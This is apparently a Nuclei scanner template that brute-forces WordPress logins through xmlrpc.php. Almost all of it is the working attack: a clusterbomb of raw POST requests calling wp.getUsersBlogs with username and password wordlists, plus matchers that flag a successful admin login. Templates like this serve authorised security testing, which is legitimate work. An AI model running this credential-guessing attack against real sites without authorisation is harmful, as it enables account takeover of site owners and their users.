http:
- attack: clusterbomb
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - url
    - xmlrpc
    - isAdmin
  matchers-condition: and
  payloads:
    password: helpers/wordlists/wp-passwords.txt
    username: helpers/wordlists/wp-users.txt
  raw:
  - "POST /xmlrpc.php HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 235\n\n<?xml version=\"\
    1.0\" encoding=\"UTF-8\"?>\n <methodCall>\n   <methodName>wp.getUsersBlogs</methodName>\n\
    \   <params>\n     <param>\n       <value>{{username}}</value>\n     </param>\n\
    \       <param>\n     <value>{{password}}</value>\n       </param>\n   </params>\n\
    \ </methodCall>\n"
id: wordpress-xmlrpc-brute-force
info:
  author: Exid
  description: This template bruteforces username and passwords through xmlrpc.php
    being available.
  metadata:
    max-request: 276
  name: Wordpress XMLRPC.php username and password Bruteforcer
  reference:
  - https://bugdasht.ir/reports/3c6841c0-ae4c-11eb-a510-517171a9198c
  - https://www.acunetix.com/vulnerabilities/web/wordpress-xml-rpc-authentication-brute-force/
  severity: high
  tags: wordpress,php,xmlrpc,fuzz
